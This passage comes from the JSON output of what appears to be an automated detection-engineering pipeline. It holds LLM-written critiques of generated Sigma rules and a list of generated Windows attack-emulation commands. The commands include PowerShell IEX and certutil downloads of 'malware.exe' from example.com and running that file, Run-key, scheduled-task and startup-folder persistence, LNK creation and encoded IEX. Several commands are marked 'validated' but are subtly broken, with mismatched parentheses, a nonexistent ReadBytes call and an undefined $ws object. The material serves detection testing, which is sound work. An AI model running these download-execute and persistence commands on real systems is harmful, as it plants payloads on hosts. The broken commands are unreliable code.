          "The rule does not include network-related indicators (e.g., destination IPs, domains, or URLs), which are critical for confirming exfiltration over C2",
          "The TTP ID is marked as 'unknown' and the tactic field is empty, reducing traceability to MITRE ATT&CK framework",
          "The rule was generated via 'langchain', suggesting potential hallucination or lack of manual validation",
          "No specific C2 infrastructure indicators are included, increasing risk of missing actual exfiltration events"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify the rule's ability to detect actual exfiltration attempts",
          "Enhance detection logic to include network connection events (e.g., Sysmon Event ID 3) correlated with process creation to confirm outbound C2 communication",
          "Add detection for additional exfiltration tools such as curl, wget, ncat, or python/perl one-liners",
          "Incorporate domain/IP indicators if known for the C2 infrastructure, or use DNS query patterns to detect beaconing behavior",
          "Refine command-line patterns to reduce false positives (e.g., require specific argument sequences or file paths)",
          "Ensure TTP metadata is fully populated with correct MITRE ATT&CK ID (T1041) and tactic (Exfiltration) for better alignment and tracking",
          "Implement thresholding or aggregation to reduce alert fatigue from repeated benign usage"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploit Public-Facing Application via NLP Pattern Matching",
        "rule_id": "bb9e6b10-7f83-4521-9436-f2a3ba9e213a",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Targets relevant suspicious command-line patterns associated with post-exploitation activity",
          "Focuses on parent processes commonly tied to public-facing applications, increasing contextual relevance",
          "Includes known adversary tooling keywords (e.g., certutil, bitsadmin, mshta) commonly used in exploitation scenarios",
          "Uses Sysmon process creation logs, which are rich for behavioral detection"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven",
          "High risk of false positives due to broad command-line keyword matching without normalization or thresholding",
          "Relies on NLP-based generation method, increasing risk of hallucinated logic or overgeneralization",
          "Lacks specificity in command-line argument context (e.g., no payload structure or attack pattern validation)",
          "Does not include network connection correlation, which is critical for confirming exploitation"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection efficacy against actual exploit attempts",
          "Narrow suspicious keyword matches with additional context (e.g., argument sequences, encoded commands)",
          "Add thresholds or chaining logic (e.g., multiple suspicious actions in sequence) to reduce false positives",
          "Incorporate network event correlation (e.g., parent process spawning outbound connection after command execution)",
          "Replace or augment NLP-generated logic with MITRE ATT&CK-aligned behavioral patterns from trusted sources"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "OS Credential Dumping Detection via NLP Pattern Matching",
        "rule_id": "4b8fef8c-9f69-4528-ba9d-34a8fe7cf5fe",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "Covers multiple known indicators of OS credential dumping",
          "Uses specific Sysmon process creation events which are rich in telemetry",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Targets high-risk behaviors such as lsass access and mimikatz usage",
          "Well-structured detection logic with clear selection criteria"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven",
          "Rule may generate false positives due to common admin commands like 'whoami' and 'Get-ADUser'",
          "Relies on exact string matching (e.g., 'sekurlsa::logonpasswords') which can be easily evaded",
          "Lacks normalization or behavioral context (e.g., parent-child process relationships)",
          "Potential hallucination: references 'procdump.exe' and specific command-line patterns without confirmation they align with actual adversary TTPs from the target technique"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection efficacy",
          "Improve detection logic by adding process provenance (e.g., parent process, user context)",
          "Use sigma rule enhancements like base64 or obfuscation-aware conditions for PowerShell",
          "Narrow 'whoami' and 'Get-ADUser' detections with additional context (e.g., unusual host, non-admin user, interactive session)",
          "Replace exact string matches with regex patterns to catch variations of mimikatz commands",
          "Align rule with MITRE ATT&CK sub-techniques under T1003 (e.g., T1003.001, T1003.007) for better coverage and tagging"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via Command-Line Archiving Tools",
        "rule_id": "e2074666-b304-43b2-84b6-7600530afc21",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule covers multiple command-line archiving methods, including native tools (zip, rar, 7z, tar) and PowerShell Compress-Archive, increasing breadth.",
          "It uses Sysmon process creation data (Image, CommandLine, ParentImage), which are reliable and commonly available in enterprise environments.",
          "The inclusion of specific command-line arguments (-r, -a, --recurse) and output file extensions improves precision for malicious archiving behavior.",
          "Condition logic is clear and modular, separating different techniques (native tools, PowerShell, WMIC child processes).",
          "Tags align with MITRE ATT&CK (T1560) and include custom context for filtering and correlation."
        ],
        "weaknesses": [
          "Detection coverage is limited by lack of real-world verification \u2014 no events were detected in testing, indicating potential gaps in pattern matching or telemetry coverage.",
          "The rule may miss adversaries using alternative archiving tools (e.g., WinRAR CLI with different paths) or obfuscation techniques (e.g., encoded commands).",
          "PowerShell detection relies on literal CommandLine matches; adversaries may use variable substitution, encoding, or aliases to evade.",
          "WMIC parent detection is narrow \u2014 assumes direct execution of zip/7z via wmic.exe, which may not reflect all lateral movement or execution chains.",
          "No normalization or case-insensitive matching for CommandLine, risking evasion via casing variations."
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to validate detection logic and tune signatures based on observed adversary behavior.",
          "Expand tool coverage to include full paths or alternate names (e.g., 7za.exe, WinRAR.exe) and consider regex patterns for flexible matching.",
          "Enhance PowerShell detection with case-insensitive matching and include detection of Base64-encoded or obfuscated commands invoking Compress-Archive.",
          "Add support for command-line argument variations and obfuscation patterns (e.g., space insertion, quotes, environment variables).",
          "Implement additional context enrichments such as user context, process ancestry depth, or file destination paths to reduce false positives and improve detection fidelity."
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Input Capture Activity via NLP Pattern Matching",
        "rule_id": "5f7789be-bdc8-4bba-b669-e0c31c74ca06",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Clear mapping to MITRE ATT&CK technique (T1056)",
          "Includes relevant false positive sources",
          "Uses behavioral indicators in description",
          "Well-structured Sigma format with proper logsource"
        ],
        "weaknesses": [
          "Detection logic is overly generic (matches any CommandLine containing 'suspicious')",
          "No real-world verification performed",
          "High risk of false positives due to vague pattern",
          "Lacks specific indicators or process names tied to input capture tools",
          "Contains no actual TTP-enriched patterns (e.g., known malicious commands, tools like keyloggers)"
        ],
        "suggestions": [
          "Replace generic 'suspicious' string with specific command-line patterns (e.g., clipboard capture, hooking APIs, screen capture tools)",
          "Add process name conditions (e.g., winword.exe spawning powershell with input capture commands)",
          "Conduct real-world testing using emulated input capture activity",
          "Incorporate known benign exclusions based on the listed false positives",
          "Use regular expressions or keyword lists for more precise detection (e.g., 'Get-Clipboard', 'screenshot', 'keylog')"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Screen Capture Activity Detected via NLP Pattern Matching",
        "rule_id": "50ae37b0-b4c9-4cb5-b4d7-ce6a8af289c1",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Rule targets relevant TTP (Screen Capture) with appropriate Sigma tags",
          "Includes realistic false positive sources, showing awareness of operational impact",
          "Uses Sysmon process creation logs, which are suitable for detecting command-line-based screen capture activity",
          "Rule structure follows Sigma format correctly and is syntactically valid"
        ],
        "weaknesses": [
          "Detection logic is overly generic (matches 'suspicious' in CommandLine) and unlikely to catch actual screen capture tools",
          "No real-world verification performed \u2014 rule effectiveness is unproven",
          "Very high risk of false negatives due to vague selection criteria",
          "Lacks specific indicators such as known screen capture tools (e.g., SnippingTool, Greenshot, ffmpeg), file path patterns, or command-line flags"
        ],
        "suggestions": [
          "Refine detection logic to include specific screen capture tools and their typical command-line usage",
          "Add multiple detection conditions using OR logic for different tools (e.g., 'snippingtool', 'nircmd', 'ffmpeg -f gdigrab')",
          "Incorporate image file path patterns (e.g., 'Desktop', 'Screenshots') in command lines",
          "Validate rule in a test environment with actual screen capture tool execution",
          "Replace generic 'suspicious' string with concrete IOCs or behavioral patterns tied to known tools"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Desktop Protocol Activity Detected via Behavioral Indicators",
        "rule_id": "f2f2b5b6-90bd-48c0-bad7-74ece7a420ee",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple behavioral indicators of RDP usage including process names and command-line arguments",
          "Includes relevant false positives in metadata, showing awareness of operational context",
          "Uses Sysmon process creation data which provides rich telemetry for detection",
          "Tags aligned with MITRE ATT&CK (T1021.001) for lateral movement via RDP"
        ],
        "weaknesses": [
          "Lack of real-world verification reduces confidence in detection efficacy",
          "Detection coverage score lowered due to no verification result (CRITICAL: must be below 5 if unverified)",
          "The 'selection_network' logic appears misaligned - matching svchost/lsass with command lines like 'termservice' may not reliably indicate RDP client activity",
          "Potential for false negatives due to reliance on specific command-line parameters that may be omitted or obfuscated"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability and tune logic accordingly",
          "Revise 'selection_network' condition to focus on actual network connection events (e.g., Sysmon Event ID 3) instead of process command lines for better accuracy",
          "Consider adding destination IP/port conditions (e.g., port 3389) in network-based detection to strengthen correlation",
          "Enhance completeness by specifying required log sources more precisely (e.g., Sysmon Event ID 1 for process creation)"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "User Execution: Malicious File",
        "rule_id": "f48e9a06-4f2f-44ae-9207-1ccda997ed63",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple behavioral indicators of malicious user execution",
          "Leverages common process creation patterns tied to Office and script hosts",
          "Includes detection of encoded commands and download tools, which are strong TTP signals",
          "Uses Sysmon process creation data effectively with relevant field conditions",
          "Well-structured with modular selections for maintainability"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Risk of false positives from legitimate admin scripts and installers not sufficiently mitigated",
          "Contains no contextual filtering (e.g., user privilege, network connection, child process depth)",
          "Relies on command-line artifacts that may be obfuscated or absent"
        ],
        "suggestions": [
          "Conduct real-world testing with simulated attacks matching T1204.002 to validate detection",
          "Add suppression logic for known good software installers or administrative tools",
          "Include process command-line length or entropy checks to flag obfuscation",
          "Enrich with parent-child process depth or session context to reduce false positives",
          "Consider adding file hash or signing checks to differentiate malicious vs. legitimate binaries in temp paths"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-23T05:34:18.853170",
      "source_agent": "913600fe-8749-4175-ac37-6b4f0ae950c5",
      "target_agent": "rulegen",
      "average_quality_score": 0.617,
      "total_rules_evaluated": 66,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.6174242424242424,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "No real-world verification performed, so detection efficacy is unproven",
        "No real-world verification was performed, so detection efficacy is unproven",
        "No real-world verification performed \u2014 detection capability is unproven",
        "No real-world verification performed, so effectiveness is unproven",
        "No real-world verification performed \u2014 detection efficacy is unproven"
      ],
      "actionable_suggestions": [
        "Conduct real-world testing or simulation to verify detection capability",
        "Perform real-world testing or simulation to verify detection capability",
        "Update TTP ID if known; currently listed as 'unknown'",
        "Conduct real-world testing or emulation to verify detection capability and refine logic",
        "Conduct real-world testing or emulation to verify detection capability"
      ]
    }
  },
  "attacks": [
    {
      "id": "3facb856-01b6-40f7-b13f-2d1074674f65",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Control Malware",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile %TEMP%\\malware.exe\"",
      "description": "Downloads a remote control malware executable using PowerShell",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.016482",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4cf96d4f-5d32-46cd-94bf-929aee12f4f4",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Control Malware",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malware.exe %TEMP%\\malware.exe",
      "description": "Downloads a remote control malware executable using certutil",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.016482",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bbd42fd7-2f99-46d7-a302-0a971970b336",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Control Malware",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process %TEMP%\\malware.exe\"",
      "description": "Executes a remote control malware executable using PowerShell",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Executes the downloaded malware",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.016482",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4944b8d3-9d23-427f-b29d-a4d2f31caae8",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Spear Phishing Attack",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://example.com/payload.txt %TEMP%\\\\payload.txt",
      "description": "Download a payload from a remote server using certutil, a built-in Windows binary commonly abused in spear phishing follow-on actions",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a remote URL to the user's temp directory. Will fail if no network connectivity, but leaves no execution trace in PowerShell logs.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:22.309881",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b4ba676a-f234-47d0-8d8d-bdf3c31b5115",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Spear Phishing Attack",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/config.xml' -OutFile '%TEMP%\\\\config.xml' -ErrorAction SilentlyContinue\"",
      "description": "Use PowerShell to silently download a configuration file that could be used to stage further actions after a spear phishing click",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory with PowerShell, suppressing errors if the request fails. Uses built-in cmdlet with minimal footprint.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:22.309881",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a9572550-bbe3-450d-b768-b3088d01fd18",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Spear Phishing Attack",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/launcher.ps1')\"",
      "description": "Execute a PowerShell script directly from a remote server, simulating code execution after a spear phishing attachment or link",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads and immediately executes a remote PowerShell script in memory. No file is written to disk, making detection more difficult. Considered high risk due to direct code execution.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:22.309881",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "85497952-83cb-4370-8020-b53c0d73ae46",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "LNK Malware",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.IO.Compression.FileSystem; $lnkFile = '%TEMP%\\test.lnk'; $zipFile = '%TEMP%\\test.zip'; Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath $zipFile -Force; (New-Object System.IO.FileStream $lnkFile, [System.IO.FileMode]::Create)).Write((New-Object System.IO.FileStream $zipFile, [System.IO.FileMode]::Open)).ReadBytes(0), 0, (New-Object System.IO.FileStream $zipFile, [System.IO.FileMode]::Open)).Length)\"",
      "description": "Creates a malicious LNK file containing a compressed zip archive with a test file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "LNK file created with compressed zip archive",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.705208",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1dec9039-b2d5-40c5-a2e2-0a4b9cda1ec7",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "LNK Malware",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$wscript = New-Object -ComObject WScript.Shell; $shortcut = $wscript.CreateShortcut('%TEMP%\\test.lnk'); $shortcut.TargetPath = 'C:\\\\Windows\\\\System32\\\\cmd.exe'; $shortcut.Arguments = '/c echo test > %TEMP%\\\\test.txt'; $shortcut.Save()\"",
      "description": "Creates a malicious LNK file that executes a command to write a test file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "LNK file created and executes command to write test file",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.705208",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8896d155-d466-45d0-8f19-99bf57b9e95a",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "LNK Malware",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.IO.Compression.FileSystem; $lnkFile = '%TEMP%\\test.lnk'; $zipFile = '%TEMP%\\test.zip'; Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath $zipFile -Force; $bytes = [System.IO.File]::ReadAllBytes($zipFile); $lnkBytes = [System.Text.Encoding]::UTF8.GetBytes('test'); $combinedBytes = New-Object byte[] ($bytes.Length + $lnkBytes.Length); [System.Array]::Copy($bytes, 0, $combinedBytes, 0, $bytes.Length); [System.Array]::Copy($lnkBytes, 0, $combinedBytes, $bytes.Length, $lnkBytes.Length); Set-Content -Path $lnkFile -Value $combinedBytes -Encoding Byte -Force\"",
      "description": "Creates a malicious LNK file containing a compressed zip archive with a test file and additional bytes",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "LNK file created with compressed zip archive and additional bytes",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.705208",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "56d5d938-b198-44e7-874f-67f13ce36208",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v test /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe /c echo test > %TEMP%\\test.txt\" /f",
      "description": "Basic: Add a registry key to run a command on startup",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Adds a registry key to run a command on startup, creating a file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:17.327660",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "157e0985-62ce-4c84-8419-fa7884a8e2d2",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('C:\\Windows\\System32\\cmd.exe', '/c', 'echo test > %TEMP%\\test.ps1')\"",
      "description": "Intermediate: Use PowerShell to start a new process that creates a file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a new process that runs a command, creating a file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:17.327660",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a9c3e34d-96e6-4d30-984b-8ac9fec6534c",
      "ttp_id": "unknown",
      "technique_id": "T1053",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /create /tn test /tr \"C:\\Windows\\System32\\cmd.exe /c echo test > %TEMP%\\test.txt\" /sc onstart",
      "description": "Advanced: Create a scheduled task to run a command on startup",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a scheduled task to run a command on startup, creating a file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:17.327660",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4700ae56-c391-4c22-86e3-9c0fd17bb810",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '%ALLUSERSPROFILE%\\\\_Startup\\\\svc.vbs' -Value 'Dim objShell\\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\\nobjShell.Run \"cmd /c echo Persistence established\", 0, False' -Force\"",
      "description": "Creates a script named 'svc.vbs' in the '%ALLUSERSPROFILE%\\\\_Startup' path to maintain persistence using PowerShell",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new file 'svc.vbs' will be created in the '%ALLUSERSPROFILE%\\\\_Startup' path, establishing persistence",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:20.257725",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "60bb044a-260c-48ac-ad27-903ff668f19b",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "echo Dim objShell > '%ALLUSERSPROFILE%\\\\_Startup\\\\svc.vbs' & echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> '%ALLUSERSPROFILE%\\\\_Startup\\\\svc.vbs' & echo objShell.Run \"cmd /c echo Persistence established\", 0, False >> '%ALLUSERSPROFILE%\\\\_Startup\\\\svc.vbs'",
      "description": "Creates a script named 'svc.vbs' in the '%ALLUSERSPROFILE%\\\\_Startup' path to maintain persistence using legacy binaries",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new file 'svc.vbs' will be created in the '%ALLUSERSPROFILE%\\\\_Startup' path, establishing persistence",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:20.257725",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "83209203-3910-4ea3-a821-a02f64246159",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.IO.Compression.FileSystem; Compress-Archive -Path '%ALLUSERSPROFILE%\\\\_Startup\\\\svc.vbs' -DestinationPath '%TEMP%\\\\svc.zip' -Force; Remove-Item -Path '%ALLUSERSPROFILE%\\\\_Startup\\\\svc.vbs' -ErrorAction SilentlyContinue\"",
      "description": "Creates a script named 'svc.vbs' in the '%ALLUSERSPROFILE%\\\\_Startup' path, archives it, and then removes the original file to maintain persistence using PowerShell",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A new file 'svc.vbs' will be created in the '%ALLUSERSPROFILE%\\\\_Startup' path, archived to '%TEMP%\\\\svc.zip', and then the original file will be removed, establishing persistence",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:20.257725",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2249cd2a-6fb3-4e07-bd3b-4dcf558da40d",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy /y C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\Users\\\\Public\\\\Startup\\\\cmd.exe",
      "description": "Basic: Copy cmd.exe to startup folder for persistence",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "cmd.exe will be executed on startup",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.835559",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "db50de63-e6c1-42bd-af53-436999089025",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $path = 'C:\\\\Users\\\\Public\\\\Startup\\\\test.exe'; $shortcut = $ws.newObject('WScript.Shell').CreateShortcut($path); $shortcut.TargetPath = 'C:\\\\Windows\\\\System32\\\\cmd.exe'; $shortcut.Save()\"",
      "description": "Intermediate: Create a shortcut to cmd.exe in the startup folder using PowerShell",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A shortcut to cmd.exe will be created in the startup folder",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.835559",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bccc88f1-3572-4d74-adde-374787f3c53c",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Persistence",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$startupFolder = 'C:\\\\Users\\\\Public\\\\Startup\\\\'; $file = 'malicious.exe'; $filePath = $startupFolder + $file; if (!(Test-Path $filePath)) { Copy-Item -Path 'C:\\\\Windows\\\\System32\\\\cmd.exe' -Destination $filePath -Force }\"",
      "description": "Advanced: Copy cmd.exe to startup folder if it doesn't exist, using PowerShell",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "cmd.exe will be copied to the startup folder if it doesn't exist",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.835559",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3a96e99d-20bc-4750-b7f4-9589c58e62d9",
      "ttp_id": "unknown",
      "technique_id": "T1140",
      "technique_name": "Code Obfuscation",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -decode \"%TEMP%\\encoded.txt\" \"%TEMP%\\ht.dll\"",
      "description": "Decodes a Base64-encoded payload (e.g., VMP-packed ht.dll) from a text file using certutil, a built-in Windows binary commonly abused for file decoding.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Reads encoded data from %TEMP%\\encoded.txt and writes decoded binary output to %TEMP%\\ht.dll. Will fail silently if input file is missing or malformed.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.138269",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f9c02ddc-abc3-4dc8-a553-cd8b2d273cac",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Code Obfuscation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = Get-Content '%TEMP%\\ht.dll' -Encoding Byte -ErrorAction Stop; Write-Host 'Simulated obfuscated DLL load attempt with length: ' $content.Length } catch { Write-Error 'File not found or access denied.' }\"",
      "description": "Simulates loading an obfuscated DLL (e.g., packed with VMP) by reading its byte content in PowerShell, mimicking reflective loading behavior without actual execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs simulated load message with file size if ht.dll exists; otherwise, logs an error. No code execution occurs.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.138269",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "97a41bff-0f56-4da0-a5b4-6ee02dd13e73",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Code Obfuscation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAdwBvAHIAbABkACwAIAB0AGgAaQBzACAAYQBjAHQAaQBvAG4AIAB1AHMAZQBzACAAYQBuACAAbwBiAGYAdQBzAGMAYQB0AGUAZAAgAGMAbwBtAG0AYQBuAGQALgAnACkA'))\"",
      "description": "Executes a Base64-encoded UTF-8 string that decodes to a benign PowerShell command, simulating execution of obfuscated scripts often seen in packed payloads.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prints 'Hello world, this action uses an obfuscated command.' to console. Uses IEX with encoded command, a common obfuscation technique.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.138269",
